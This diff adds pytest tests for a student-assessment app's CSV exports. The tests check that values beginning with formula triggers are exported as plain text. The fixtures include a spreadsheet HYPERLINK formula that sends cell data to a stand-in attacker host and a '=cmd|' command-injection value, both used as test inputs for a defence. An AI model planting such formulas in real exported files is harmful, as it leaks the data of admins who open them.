@@ -13,9 +13,12 @@ import uuid
 import zipfile
 from datetime import datetime, timezone
 
+import pytest
+
 from app.i18n import use_locale
 from app.schemas.admin import (
     AdminAssessmentDetailResponse,
+    AdminMotivationResponseItem,
     AdminResponseItem,
     AdminUserListItem,
 )
@@ -202,6 +205,106 @@ def test_exports_stay_russian_for_a_kazakh_admin() -> None:
     assert riasec_row[header.index("Шкала")] == "Артистичный"
 
     assert _cell(users, "Цель последнего") == "Поступить в вуз"
+
+
+# --- formulas typed by students (SEC-09) -------------------------------------
+
+_FORMULA = '=HYPERLINK("https://evil.example/?d="&B2,"Открыть анкету")'
+_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r", "\n")
+
+
+def _is_live_formula(cell: str) -> bool:
+    """What a spreadsheet would run: starts like a formula and is not just a
+    signed number."""
+    if not cell.startswith(_FORMULA_STARTS):
+        return False
+    try:
+        float(cell)
+    except ValueError:
+        return True
+    return False
+
+
+def test_a_formula_in_a_student_field_is_exported_as_text() -> None:
+    csv_text = export.users_to_csv([_user_item(email="=cmd|x@example.test", city=_FORMULA)])
+
+    # The apostrophe turns the cell into text; the value itself is intact.
+    assert _cell(csv_text, "Город") == "'" + _FORMULA
+    assert _cell(csv_text, "Email") == "'=cmd|x@example.test"
+
+
+@pytest.mark.parametrize("start", _FORMULA_STARTS)
+def test_every_formula_trigger_is_neutralised(start: str) -> None:
+    csv_text = export.users_to_csv([_user_item(city=f"{start}1+1")])
+
+    assert _cell(csv_text, "Город") == f"'{start}1+1"
+
+
+@pytest.mark.parametrize("city", ["Алматы", "Нур-Султан", "г. Астана =)", "a=b", "100%"])
+def test_ordinary_text_is_left_exactly_as_typed(city: str) -> None:
+    csv_text = export.users_to_csv([_user_item(city=city)])
+
+    assert _cell(csv_text, "Город") == city
+
+
+def test_numbers_stay_numbers_including_negative_scores() -> None:
+    """A score written as "-0.5" is data an admin sorts and averages — an
+    apostrophe in front would turn the column into text."""
+    csv_text = export.users_to_csv([_user_item(riasec={"R": -0.5, "I": 3}, age=16)])
+
+    assert _cell(csv_text, "RIASEC: Реалистичный") == "-0.5"
+    assert _cell(csv_text, "Возраст") == "16"
+    assert export._cell("-0.5") == "-0.5"
+    assert export._cell("+7") == "+7"
+    assert export._cell("-1+1") == "'-1+1"
+    assert export._cell("+7 701 000 00 00") == "'+7 701 000 00 00"
+
+
+def test_no_file_of_either_export_carries_a_live_formula() -> None:
+    """Every cell of all four CSVs, with a formula in each field that holds
+    text from outside — so a column added later is covered as well."""
+    when = datetime(2026, 9, 3, 9, 40, tzinfo=timezone.utc)
+    detail = _detail(
+        user_email="=cmd|x@example.test",
+        profile_name="-Анна",
+        responses=[
+            AdminResponseItem(
+                question_id=uuid.uuid4(),
+                instrument="@riasec",
+                category="+A",
+                question_text=_FORMULA,
+                question_order=1,
+                answer_value=5,
+                selected_answer_text=_FORMULA,
+                created_at=when,
+            )
+        ],
+        motivation_responses=[
+            AdminMotivationResponseItem(
+                triplet_index=1,
+                picked_most_text=_FORMULA,
+                picked_most_category="=money",
+                picked_least_text="+text",
+                picked_least_category="-status",
+                not_picked_text="@text",
+                not_picked_category="\tgrowth",
+                created_at=when,
+            )
+        ],
+    )
+    files = {
+        "users_export.csv": export.users_to_csv(
+            [_user_item(email="=cmd|x@example.test", profile_name="-Анна", city=_FORMULA)]
+        ),
+        **{
+            name: _zip_member(detail, name).lstrip("\ufeff")
+            for name in ("summary.csv", "responses.csv", "motivation.csv")
+        },
+    }
+
+    for name, text in files.items():
+        live = [cell for row in _rows(text) for cell in row if _is_live_formula(cell)]
+        assert live == [], f"{name}: {live}"
 
 
 # --- the downloaded filename ------------------------------------------------
